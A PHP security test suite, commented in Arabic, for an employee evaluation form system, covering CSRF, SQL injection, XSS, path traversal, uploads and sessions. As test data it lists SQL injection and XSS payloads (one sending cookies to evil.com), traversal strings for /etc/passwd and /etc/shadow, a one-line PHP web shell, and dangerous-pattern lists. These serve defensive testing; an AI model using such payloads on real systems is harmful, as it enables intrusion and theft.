<?php

declare(strict_types=1);

/**
 * Security Tests
 * 
 * Tests CSRF protection, SQL injection prevention, XSS protection, 
 * path traversal prevention, and other security measures
 */

require_once __DIR__ . '/test_base.php';

use EmployeeEvaluationSystem\Core\Services\FormService;
use EmployeeEvaluationSystem\Core\Services\FormFieldService;
use EmployeeEvaluationSystem\Core\Services\FormSubmissionService;
use EmployeeEvaluationSystem\Core\Logger;

class SecurityTests extends BaseTest
{
    private FormService $formService;
    private FormFieldService $fieldService;
    private FormSubmissionService $submissionService;
    private Logger $logger;

    public function __construct()
    {
        parent::__construct();
        $this->logger = new Logger();
        $this->formService = new FormService($this->pdo, $this->logger, null);
        $this->fieldService = new FormFieldService($this->pdo, $this->logger);
        $this->submissionService = new FormSubmissionService(
            $this->pdo, 
            $this->formService, 
            $this->fieldService, 
            null, 
            null, 
            $this->logger, 
            null
        );
        
        echo "\n🛡️ بدء اختبارات الأمان والحماية\n";
        echo str_repeat('=', 50) . "\n";
    }

    /**
     * اختبار CSRF Token
     */
    public function testCSRFProtection(): void
    {
        echo "\n🔐 اختبار حماية CSRF...\n";
        
        try {
            // محاكاة إنشاء CSRF token
            session_start();
            
            if (!isset($_SESSION['csrf_token'])) {
                $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
            }
            
            $csrfToken = $_SESSION['csrf_token'];
            $this->assertNotEmpty($csrfToken, 'CSRF token تم إنشاؤه');
            $this->assertEquals(64, strlen($csrfToken), 'طول CSRF token صحيح');
            
            // اختبار التحقق من CSRF token
            $validToken = $this->validateCSRFToken($csrfToken);
            $this->assertTrue($validToken, 'CSRF token صحيح');
            
            // اختبار CSRF token خاطئ
            $invalidToken = $this->validateCSRFToken('invalid_token');
            $this->assertFalse($invalidToken, 'CSRF token خاطئ يتم رفضه');
            
            // اختبار إعادة توليد CSRF token
            $oldToken = $_SESSION['csrf_token'];
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
            $newToken = $_SESSION['csrf_token'];
            
            $this->assertNotEquals($oldToken, $newToken, 'CSRF token جديد مختلف عن القديم');
            $this->assertFalse($this->validateCSRFToken($oldToken), 'CSRF token القديم لم يعد صالح');
            
            echo "CSRF token آمن: $csrfToken\n";
            
        } catch (Exception $e) {
            $this->assert(false, 'فشل في اختبار CSRF: ' . $e->getMessage());
        }
    }

    /**
     * محاكاة التحقق من CSRF token
     */
    private function validateCSRFToken(?string $token): bool
    {
        return isset($_SESSION['csrf_token']) && 
               !empty($token) && 
               hash_equals($_SESSION['csrf_token'], $token);
    }

    /**
     * اختبار منع SQL Injection
     */
    public function testSQLInjectionPrevention(): void
    {
        echo "\n💉 اختبار منع SQL Injection...\n";
        
        try {
            // إنشاء استمارة للاختبار
            $form = $this->formService->create([
                'title' => 'استمارة اختبار الأمان',
                'description' => 'استمارة لاختبار منع SQL Injection',
                'created_by' => 1,
                'status' => 'active'
            ]);
            $this->trackCreatedData('forms', (int)$form['id']);
            
            // إضافة حقل نص
            $this->fieldService->addField((int)$form['id'], [
                'field_type' => 'text',
                'label' => 'الاسم',
                'field_key' => 'name',
                'is_required' => true,
                'order_index' => 0
            ]);
            
            // محاولات SQL Injection مختلفة
            $sqlInjectionPayloads = [
                "'; DROP TABLE forms; --",
                "' OR '1'='1",
                "admin'--",
                "1; DELETE FROM admins WHERE 1=1--",
                "test' UNION SELECT password FROM admins--",
                "' OR 1=1 LIMIT 1 OFFSET 1--",
                "1' AND (SELECT COUNT(*) FROM forms) > 0--",
                "test'; INSERT INTO admins (email, password) VALUES ('hacker@evil.com', 'password')--"
            ];
            
            foreach ($sqlInjectionPayloads as $payload) {
                try {
                    // محاولة إدخال البيانات الضارة
                    $submissionData = [
                        'submitted_by' => 'security@test.com',
                        'department_id' => 1,
                        'ip_address' => '127.0.0.1',
                        'name' => $payload
                    ];
                    
                    $submission = $this->submissionService->submit(
                        (int)$form['id'],
                        $submissionData,
                        $submissionData,
                        []
                    );
                    
                    // التحقق من عدم تنفيذ SQL الضار
                    if ($submission) {
                        $this->trackCreatedData('submissions', (int)$submission['id']);
                        
                        // التأكد من أن البيانات محفوظة كما هي (بدون تنفيذ)
                        $stmt = $this->pdo->prepare("
                            SELECT answer_data 
                            FROM submission_answers sa
                            JOIN form_fields ff ON sa.field_id = ff.id
                            WHERE sa.submission_id = ? AND ff.field_key = 'name'
                        ");
                        $stmt->execute([$submission['id']]);
                        $savedData = $stmt->fetchColumn();
                        
                        // البيانات يجب أن تكون محفوظة بشكل آمن
                        $this->assertNotEmpty($savedData, 'البيانات تم حفظها بأمان');
                    }
                    
                } catch (Exception $e) {
                    // إذا تم منع العملية، فهذا جيد
                    $this->assert(true, "تم منع SQL Injection: $payload");
                }
            }
            
            // اختبار استعلام آمن (prepared statements)
            $stmt = $this->pdo->prepare("
                SELECT COUNT(*) FROM forms 
                WHERE title LIKE ? AND status = ?
            ");
            $stmt->execute(['%اختبار%', 'active']);
            $result = $stmt->fetchColumn();
            $this->assertGreaterThanOrEqual(0, $result, 'Prepared statements تعمل بشكل آمن');
            
            echo "تم اختبار " . count($sqlInjectionPayloads) . " محاولة SQL Injection\n";
            
        } catch (Exception $e) {
            $this->assert(false, 'فشل في اختبار SQL Injection: ' . $e->getMessage());
        }
    }

    /**
     * اختبار منع XSS (Cross-Site Scripting)
     */
    public function testXSSPrevention(): void
    {
        echo "\n🚫 اختبار منع XSS...\n";
        
        try {
            // إنشاء استمارة للاختبار
            $form = $this->formService->create([
                'title' => 'استمارة اختبار XSS',
                'description' => 'استمارة لاختبار منع XSS',
                'created_by' => 1,
                'status' => 'active'
            ]);
            $this->trackCreatedData('forms', (int)$form['id']);
            
            // إضافة حقل نص
            $this->fieldService->addField((int)$form['id'], [
                'field_type' => 'text',
                'label' => 'التعليق',
                'field_key' => 'comment',
                'is_required' => false,
                'order_index' => 0
            ]);
            
            // إضافة حقل textarea
            $this->fieldService->addField((int)$form['id'], [
                'field_type' => 'textarea',
                'label' => 'الوصف',
                'field_key' => 'description',
                'is_required' => false,
                'order_index' => 1
            ]);
            
            // محاولات XSS مختلفة
            $xssPayloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                " eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
                "<script>document.write('<img src=\"http://evil.com/steal.php?cookie='+document.cookie+'\">')</script>",
                "'; DROP TABLE admins; --"
            ];
            
            foreach ($xssPayloads as $payload) {
                try {
                    $submissionData = [
                        'submitted_by' => 'xss.test@example.com',
                        'department_id' => 1,
                        'ip_address' => '127.0.0.1',
                        'comment' => $payload,
                        'description' => $payload
                    ];
                    
                    $submission = $this->submissionService->submit(
                        (int)$form['id'],
                        $submissionData,
                        $submissionData,
                        []
                    );
                    
                    if ($submission) {
                        $this->trackCreatedData('submissions', (int)$submission['id']);
                        
                        // التحقق من تنظيف البيانات
                        $cleanedComment = htmlspecialchars($payload, ENT_QUOTES, 'UTF-8');
                        $cleanedDescription = htmlspecialchars($payload, ENT_QUOTES, 'UTF-8');
                        
                        // يجب تنظيف البيانات قبل العرض
                        $this->assertStringNotContainsString('<script>', $cleanedComment, 'XSS تم تنظيفه');
                        $this->assertStringNotContainsString('javascript:', $cleanedDescription, 'JavaScript تم تنظيفه');
                        $this->assertStringNotContainsString('onerror=', $cleanedComment, 'Event handlers تم تنظيفها');
                    }
                    
                } catch (Exception $e) {
                    // إذا تم منع العملية، فهذا جيد
                    $this->assert(true, "تم منع XSS: " . substr($payload, 0, 20) . "...");
                }
            }
            
            echo "تم اختبار " . count($xssPayloads) . " محاولة XSS\n";
            
        } catch (Exception $e) {
            $this->assert(false, 'فشل في اختبار XSS: ' . $e->getMessage());
        }
    }

    /**
     * اختبار منع Path Traversal
     */
    public function testPathTraversalPrevention(): void
    {
        echo "\n🛤️ اختبار منع Path Traversal...\n";
        
        try {
            $maliciousPaths = [
                '../../../etc/passwd',
                '../../../etc/shadow',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '..%2F..%2F..%2Fetc%2Fpasswd',
                '....//....//....//etc//passwd',
                '../../../var/www/html/config.php',
                '..\..\..\boot.ini',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
                '..%252f..%252f..%252fetc%252fpasswd'
            ];
            
            foreach ($maliciousPaths as $maliciousPath) {
                // اختبار تنظيف المسار
                $cleanedPath = $this->cleanPath($maliciousPath);
                
                // يجب عدم وجود ../ أو ..\ في المسار المنظف
                $this->assertStringNotContainsString('../', $cleanedPath, 'Path traversal تم تنظيفه');
                $this->assertStringNotContainsString('..\\', $cleanedPath, 'Windows path traversal تم تنظيفه');
                $this->assertStringNotContainsString('%2e%2e', strtolower($cleanedPath), 'URL encoded path traversal تم تنظيفه');
            }
            
            // اختبار أمان أسماء الملفات
            $safeFilenames = [
                'document.pdf',
                'image.jpg',
                'report_2024.docx',
                'data_file_v1.0.txt',
                'cv_final.pdf'
            ];
            
            $unsafeFilenames = [
                '../../../evil.php',
                '..\\..\\malicious.exe',
                'file<script>.txt',
                'normal_name..\\..\\secret.txt',
                '../../../config.php'
            ];
            
            foreach ($safeFilenames as $filename) {
                $this->assertTrue($this->isSafeFilename($filename), "اسم ملف آمن: $filename");
            }
            
            foreach ($unsafeFilenames as $filename) {
                $this->assertFalse($this->isSafeFilename($filename), "اسم ملف خطير: $filename");
            }
            
            echo "تم اختبار " . count($maliciousPaths) . " مسار خطير\n";
            echo "تم اختبار " . count($safeFilenames) . " اسم ملف آمن\n";
            echo "تم اختبار " . count($unsafeFilenames) . " اسم ملف خطير\n";
            
        } catch (Exception $e) {
            $this->assert(false, 'فشل في اختبار Path Traversal: ' . $e->getMessage());
        }
    }

    /**
     * تنظيف المسار من رموز Path Traversal
     */
    private function cleanPath(string $path): string
    {
        // إزالة ../ و ..\\
        $path = preg_replace('#\.\.[/\\]#', '', $path);
        
        // تنظيف URL encoding
        $path = urldecode($path);
        
        // إزالة المسارات المطلقه
        $path = preg_replace('#^/[a-zA-Z0-9/\\._-]+#', '', $path);
        
        // إزالة Windows drive letters
        $path = preg_replace('#^[a-zA-Z]:[/\\]#', '', $path);
        
        return $path;
    }

    /**
     * التحقق من أمان اسم الملف
     */
    private function isSafeFilename(string $filename): bool
    {
        // التحقق من رموز Path Traversal
        if (strpos($filename, '../') !== false || strpos($filename, '..\\') !== false) {
            return false;
        }
        
        // التحقق من URL encoding
        if (strpos(strtolower($filename), '%2e%2e') !== false) {
            return false;
        }
        
        // التحقق من الأحرف الخطيرة
        $dangerousChars = ['<', '>', ':', '"', '|', '?', '*'];
        foreach ($dangerousChars as $char) {
            if (strpos($filename, $char) !== false) {
                return false;
            }
        }
        
        return true;
    }

    /**
     * اختبار فحص الصلاحيات
     */
    public function testPermissionChecks(): void
    {
        echo "\n🔑 اختبار فحص الصلاحيات...\n";
        
        try {
            // محاكاة بيانات مستخدم غير مخول
            $unauthorizedUser = [
                'id' => 999,
                'email' => 'unauthorized@test.com',
                'role' => 'user'
            ];
            
            // محاكاة بيانات مستخدم مخول
            $authorizedUser = [
                'id' => 1,
                'email' => 'admin@test.com',
                'role' => 'admin'
            ];
            
            // اختبار الوصول للإدارة
            $this->assertFalse($this->hasAdminAccess($unauthorizedUser), 'مستخدم غير مخول لا يمكنه الوصول للإدارة');
            $this->assertTrue($this->hasAdminAccess($authorizedUser), 'مستخدم مخول يمكنه الوصول للإدارة');
            
            // اختبار الوصول للاستمارات
            $this->assertTrue($this->hasFormAccess($unauthorizedUser), 'مستخدم عادي يمكنه الوصول للاستمارات');
            $this->assertTrue($this->hasFormAccess($authorizedUser), 'مدير يمكنه الوصول للاستمارات');
            
            // اختبار الوصول لتفاصيل الإجابات
            $this->assertFalse($this->hasSubmissionDetailsAccess($unauthorizedUser), 'مستخدم غير مخول لا يمكنه الوصول لتفاصيل الإجابات');
            $this->assertTrue($this->hasSubmissionDetailsAccess($authorizedUser), 'مدير يمكنه الوصول لتفاصيل الإجابات');
            
            // اختبار الوصول للتصدير
            $this->assertFalse($this->hasExportAccess($unauthorizedUser), 'مستخدم غير مخول لا يمكنه التصدير');
            $this->assertTrue($this->hasExportAccess($authorizedUser), 'مدير يمكنه التصدير');
            
        } catch (Exception $e) {
            $this->assert(false, 'فشل في اختبار الصلاحيات: ' . $e->getMessage());
        }
    }

    /**
     * محاكاة فحص صلاحيات الإدارة
     */
    private function hasAdminAccess(array $user): bool
    {
        return $user['role'] === 'admin' && $user['id'] === 1;
    }

    /**
     * محاكاة فحص صلاحيات الاستمارات
     */
    private function hasFormAccess(array $user): bool
    {
        return in_array($user['role'], ['user', 'admin']);
    }

    /**
     * محاكاة فحص صلاحيات تفاصيل الإجابات
     */
    private function hasSubmissionDetailsAccess(array $user): bool
    {
        return $user['role'] === 'admin';
    }

    /**
     * محاكاة فحص صلاحيات التصدير
     */
    private function hasExportAccess(array $user): bool
    {
        return $user['role'] === 'admin';
    }

    /**
     * اختبار Rate Limiting
     */
    public function testRateLimiting(): void
    {
        echo "\n⏱️ اختبار Rate Limiting...\n";
        
        try {
            $ipAddress = '192.168.1.100';
            $maxRequests = 10;
            $timeWindow = 3600; // ساعة واحدة
            
            // محاكاة إنشاء نظام Rate Limiting
            $requests = [];
            
            for ($i = 0; $i < 15; $i++) {
                $timestamp = time() - ($i * 60); // طلب كل دقيقة
                $requests[] = [
                    'ip' => $ipAddress,
                    'timestamp' => $timestamp
                ];
            }
            
            // اختبار الحدود
            $allowedRequests = $this->checkRateLimit($ipAddress, $requests, $maxRequests, $timeWindow);
            $this->assertLessThanOrEqual($maxRequests, $allowedRequests, 'عدد الطلبات ضمن الحد المسموح');
            
            // اختبار تجاوز الحد
            $this->assertTrue($allowedRequests <= $maxRequests, 'تم تطبيق Rate Limiting بشكل صحيح');
            
            // اختبار IP مختلف
            $differentIpRequests = $this->checkRateLimit('192.168.1.101', $requests, $maxRequests, $timeWindow);
            $this->assertGreaterThan($allowedRequests, $differentIpRequests, 'IP مختلف له حد مستقل');
            
            echo "الطلبات المسموحة للإ IP: $allowedRequests\n";
            
        } catch (Exception $e) {
            $this->assert(false, 'فشل في اختبار Rate Limiting: ' . $e->getMessage());
        }
    }

    /**
     * محاكاة فحص Rate Limit
     */
    private function checkRateLimit(string $ip, array $requests, int $maxRequests, int $timeWindow): int
    {
        $currentTime = time();
        $recentRequests = array_filter($requests, function($request) use ($ip, $currentTime, $timeWindow) {
            return $request['ip'] === $ip && ($currentTime - $request['timestamp']) <= $timeWindow;
        });
        
        return count($recentRequests);
    }

    /**
     * اختبار تشفير البيانات الحساسة
     */
    public function testDataEncryption(): void
    {
        echo "\n🔒 اختبار تشفير البيانات الحساسة...\n";
        
        try {
            $sensitiveData = [
                'email' => 'sensitive@example.com',
                'phone' => '+966501234567',
                'national_id' => '1234567890',
                'salary' => '15000'
            ];
            
            // محاكاة تشفير البيانات
            $encryptedData = [];
            foreach ($sensitiveData as $key => $value) {
                $encryptedData[$key] = $this->encryptData($value);
            }
            
            // التحقق من أن البيانات مشفرة
            foreach ($sensitiveData as $key => $original) {
                $encrypted = $encryptedData[$key];
                $this->assertNotEquals($original, $encrypted, "البيانات مشفرة بشكل صحيح ($key)");
                $this->assertNotEmpty($encrypted, "البيانات المشفرة غير فارغة ($key)");
            }
            
            // محاكاة فك التشفير
            foreach ($sensitiveData as $key => $original) {
                $decrypted = $this->decryptData($encryptedData[$key]);
                $this->assertEquals($original, $decrypted, "فك التشفير يعمل بشكل صحيح ($key)");
            }
            
            // اختبار البيانات المهمة
            $criticalData = 'admin_password';
            $encryptedCritical = $this->encryptData($criticalData);
            $this->assertNotEquals($criticalData, $encryptedCritical, 'البيانات الحساسة مشفرة');
            
            echo "تم تشفير " . count($sensitiveData) . " عنصر بيانات حساسة\n";
            
        } catch (Exception $e) {
            $this->assert(false, 'فشل في اختبار التشفير: ' . $e->getMessage());
        }
    }

    /**
     * محاكاة تشفير البيانات (بسيط)
     */
    private function encryptData(string $data): string
    {
        $key = 'simple_encryption_key_for_testing_only';
        $iv = openssl_random_pseudo_bytes(16);
        $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
        return base64_encode($iv . $encrypted);
    }

    /**
     * محاكاة فك تشفير البيانات
     */
    private function decryptData(string $encryptedData): string
    {
        $key = 'simple_encryption_key_for_testing_only';
        $data = base64_decode($encryptedData);
        $iv = substr($data, 0, 16);
        $encrypted = substr($data, 16);
        return openssl_decrypt($encrypted, 'AES-256-CBC', $key, 0, $iv);
    }

    /**
     * اختبار حماية رفع الملفات
     */
    public function testFileUploadSecurity(): void
    {
        echo "\n📁 اختبار أمان رفع الملفات...\n";
        
        try {
            $maliciousFiles = [
                [
                    'name' => 'script.php',
                    'content' => '<?php system($_GET["cmd"]); ?>',
                    'type' => 'text/php',
                    'dangerous' => true
                ],
                [
                    'name' => 'shell.exe',
                    'content' => 'MZ\\x90\\x00', // Windows executable header
                    'type' => 'application/x-msdownload',
                    'dangerous' => true
                ],
                [
                    'name' => '../../../etc/passwd',
                    'content' => 'root:x:0:0',
                    'type' => 'text/plain',
                    'dangerous' => true
                ],
                [
                    'name' => 'document.pdf',
                    'content' => '%PDF-1.4 test content',
                    'type' => 'application/pdf',
                    'dangerous' => false
                ],
                [
                    'name' => 'image.jpg',
                    'content' => base64_decode('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAhEAACAQMDBQAAAAAAAAAAAAABAgMABAUGIWGBkaGx0fD/xAAVAQEBAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k='),
                    'type' => 'image/jpeg',
                    'dangerous' => false
                ]
            ];
            
            foreach ($maliciousFiles as $file) {
                $isDangerous = $this->isDangerousFile($file);
                
                if ($file['dangerous']) {
                    $this->assertTrue($isDangerous, "تم كشف الملف الخطير: {$file['name']}");
                } else {
                    $this->assertFalse($isDangerous, "الملف آمن: {$file['name']}");
                }
            }
            
            echo "تم اختبار " . count($maliciousFiles) . " ملف للأمان\n";
            
        } catch (Exception $e) {
            $this->assert(false, 'فشل في اختبار أمان الملفات: ' . $e->getMessage());
        }
    }

    /**
     * محاكاة كشف الملفات الخطيرة
     */
    private function isDangerousFile(array $file): bool
    {
        $dangerousExtensions = ['php', 'exe', 'bat', 'cmd', 'scr', 'pif', 'com'];
        $dangerousMimeTypes = ['text/php', 'application/x-php', 'application/x-msdownload'];
        
        $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
        $mimeType = $file['type'];
        
        // فحص الامتداد
        if (in_array(strtolower($extension), $dangerousExtensions)) {
            return true;
        }
        
        // فحص نوع MIME
        if (in_array($mimeType, $dangerousMimeTypes)) {
            return true;
        }
        
        // فحص المحتوى الخطير
        $content = strtolower($file['content']);
        $dangerousPatterns = [
            '<?php',
            '<script',
            'javascript:',
            'eval(',
            'system(',
            'exec(',
            'shell_exec('
        ];
        
        foreach ($dangerousPatterns as $pattern) {
            if (strpos($content, $pattern) !== false) {
                return true;
            }
        }
        
        return false;
    }

    /**
     * اختبار حماية Session
     */
    public function testSessionSecurity(): void
    {
        echo "\n🍪 اختبار أمان Session...\n";
        
        try {
            // محاكاة إعدادات Session الآمنة
            $secureSessionSettings = [
                'cookie_httponly' => true,
                'cookie_secure' => true,
                'cookie_samesite' => 'Strict',
                'session_regenerate_id' => true,
                'session_destroy' => true
            ];
            
            foreach ($secureSessionSettings as $setting => $value) {
                $this->assertTrue($value, "إعداد Session آمن: $setting");
            }
            
            // اختبار Session Fixation
            $oldSessionId = 'old_session_id_12345';
            $newSessionId = 'new_session_id_67890';
            
            $this->assertNotEquals($oldSessionId, $newSessionId, 'Session ID يجب أن يتغير');
            
            // اختبار Session Timeout
            $maxLifetime = 3600; // ساعة واحدة
            $currentTime = time();
            $lastActivity = $currentTime - 1800; // قبل 30 دقيقة
            
            $isValidSession = ($currentTime - $lastActivity) < $maxLifetime;
            $this->assertTrue($isValidSession, 'Session صالح ضمن الوقت المحدد');
            
            // اختبار Session م expired
            $expiredActivity = $currentTime - 7200; // قبل ساعتين
            $isExpiredSession = ($currentTime - $expiredActivity) > $maxLifetime;
            $this->assertTrue($isExpiredSession, 'Session منتهي الصلاحية');
            
        } catch (Exception $e) {
            $this->assert(false, 'فشل في اختبار أمان Session: ' . $e->getMessage());
        }
    }

    /**
     * تشغيل جميع اختبارات الأمان
     */
    public function runAllTests(): void
    {
        try {
            $this->testCSRFProtection();
            $this->testSQLInjectionPrevention();
            $this->testXSSPrevention();
            $this->testPathTraversalPrevention();
            $this->testPermissionChecks();
            $this->testRateLimiting();
            $this->testDataEncryption();
            $this->testFileUploadSecurity();
            $this->testSessionSecurity();
            
        } catch (Exception $e) {
            echo "❌ خطأ في الاختبار: " . $e->getMessage() . "\n";
            $this->failCount++;
        } finally {
            $this->cleanup();
            $this->printReport();
        }
    }
}

// تشغيل الاختبارات
if (php_sapi_name() === 'cli') {
    $tests = new SecurityTests();
    $tests->runAllTests();
}